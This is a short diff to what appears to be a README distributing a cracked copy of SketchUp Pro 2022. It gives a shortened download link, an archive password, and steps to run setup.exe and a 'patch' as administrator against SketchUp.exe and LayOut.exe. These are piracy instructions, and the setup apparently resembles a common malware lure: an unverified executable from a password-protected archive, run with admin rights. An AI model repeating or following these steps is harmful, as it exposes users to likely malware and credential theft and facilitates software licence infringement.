@@ -4,7 +4,7 @@
 
 - [Download](https://goo.su/TdL3IM)
 - Open archive (password: Project12!)
-- Install SketchUp Pro 2022
+- Run setup.exe for install SketchUp
 - Copy patch to installation directory
 - Open patch as admin, apply it will Patch SketchUp.exe Auto
 - then ask for location choose manually target LayOut.exe in folder C:\Program Files\SketchUp\SketchUp 2022\LayOut
